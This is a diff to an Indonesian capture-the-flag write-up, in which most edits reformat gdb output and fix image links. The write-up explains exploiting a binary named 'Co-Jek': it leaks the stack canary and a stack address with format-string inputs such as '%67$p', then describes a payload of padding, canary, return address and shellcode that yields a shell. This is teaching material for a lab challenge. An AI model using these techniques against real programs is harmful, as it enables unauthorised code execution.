@@ -487,8 +487,7 @@ GamaCTF{Ini_Bukan_Flagnya}
 ```
 
 ### Flag
-```GamaCTF{Ini_Bukan_Flagnya}```
-
+`GamaCTF{Ini_Bukan_Flagnya}`.
 
 ## Bebas
 
@@ -545,9 +544,9 @@ Berikut flow exploit dan pembuatan payload yang dilakukan.
    0x8048673 <main+43>: call   0x80485e6 <init>
    ...
 
-0x08048671 in main ()
-gdb-peda$ i r $eax
-eax            0x406e700        0x406e700
+  0x08048671 in main ()
+  gdb-peda$ i r $eax
+  eax            0x406e700        0x406e700
 ```
 
 Canary memiliki nullbyte. Cari value canary dengan brute offset canary dan cari yang memiliki nullbyte diakhir dan debug binary untuk memastikan itu adalah nilai canary.
@@ -582,58 +581,57 @@ if __name__ == '__main__':
 Ada beberapa output yang memiliki nullbyte diakhir, coba debug binary leak pada offset 63.
 
 ```py
-Legend: code, data, rodata, value
-0x08048671 in main ()
-gdb-peda$ i r $eax
-eax            0xb376ff00       0xb376ff00
+  Legend: code, data, rodata, value
+  0x08048671 in main ()
+  gdb-peda$ i r $eax
+  eax            0xb376ff00       0xb376ff00
 ```
 Canary adalah 0xb376ff00, continue dengan command `c` dan masukkan nama "%63$p".
 ```py
-gdb-peda$ c
-Continuing.
-Selamat Datang di Co-Jek
-Masukan Nama Anda:
->> %63$p
-Hai 0xf7ffd000!
-...
+  gdb-peda$ c
+  Continuing.
+  Selamat Datang di Co-Jek
+  Masukan Nama Anda:
+  >> %63$p
+  Hai 0xf7ffd000!
+  ...
 ```
 Hmm, ternyata offset 63 bukan merupakan canary. Lakukan pada offset berikutnya tadi dengan cara seperti diatas, dan ditemukan canary pada offset ke-67.
 
 ```py
-0x08048671 in main ()
-gdb-peda$ i r $eax
-eax            0xb1b3b000       0xb1b3b000
-gdb-peda$ c
-Continuing.
-Selamat Datang di Co-Jek
-Masukan Nama Anda:
->> %67$p
-Hai 0xb1b3b000!
-Masukan alamat : 
-```
+  0x08048671 in main ()
+  gdb-peda$ i r $eax
+  eax            0xb1b3b000       0xb1b3b000
+  gdb-peda$ c
+  Continuing.
+  Selamat Datang di Co-Jek
+  Masukan Nama Anda:
+  >> %67$p
+  Hai 0xb1b3b000!
+  Masukan alamat : 
+  ```
 
 Selajutnya adalah mencari address stack. Dari semua offset, saya menggunakan offset 2.
 
 ```py
-0x080486cc in main ()                                                                     
-gdb-peda$ ni                                                                
-Hai 0xd1ea3200||0xffffcd1a! 
-   ...
-   0x80486f0 <main+168>:        call   0x8048460 <gets@plt>
-=> 0x80486f5 <main+173>:        add    esp,0x10
-   0x80486f8 <main+176>:        sub    esp,0xc
-   ...
-[------------------------------------stack-------------------------------------]
-0000| 0xffffcca0 --> 0xffffccb6 ("AAAABBBBCCCC")
-...
-gdb-peda$ p 0xffffcd1a-0xffffccb6
-$1 = 0x64
-
+  0x080486cc in main ()                                                                     
+  gdb-peda$ ni                                                                
+  Hai 0xd1ea3200||0xffffcd1a! 
+     ...
+     0x80486f0 <main+168>:        call   0x8048460 <gets@plt>
+  => 0x80486f5 <main+173>:        add    esp,0x10
+     0x80486f8 <main+176>:        sub    esp,0xc
+     ...
+  [------------------------------------stack-------------------------------------]
+  0000| 0xffffcca0 --> 0xffffccb6 ("AAAABBBBCCCC")
+  ...
+  gdb-peda$ p 0xffffcd1a-0xffffccb6
+  $1 = 0x64
 ```
 
 Alamat yang bocor pada offset 2 adalah `0xffffcd1a`, sementara alamat stack adalah `0xffffccb6`. Selisih/jarak alamat pada offset 2 dan alamat stack adalah `0x64`. Maka untuk mendapatkan alamat stack, leak pada offset 2 lalu kurangi `0x64`.
 
-![Output](https://github.com/abdullahnz/abdullahnz.github.io/_posts/images/asgama_5.png)
+![Output](https://raw.githubusercontent.com/abdullahnz/abdullahnz.github.io/master/_posts/images/asgama_5.png)
 
 Selanjutnya dilakukan pembuatan payload. Flow paylaod: `padding + canary + return address ke alamat stack 2 kali + shellcode`.
 
@@ -649,7 +647,7 @@ Selanjutnya dilakukan pembuatan payload. Flow paylaod: `padding + canary + retur
 
 Run exploit dan didapatkan shell.
 
-![Shell](https://github.com/abdullahnz/abdullahnz.github.io/_posts/images/asgama_5s.png)
+![Shell](https://raw.githubusercontent.com/abdullahnz/abdullahnz.github.io/master/_posts/images/asgama_5s.png)
 
 
 ## Notes
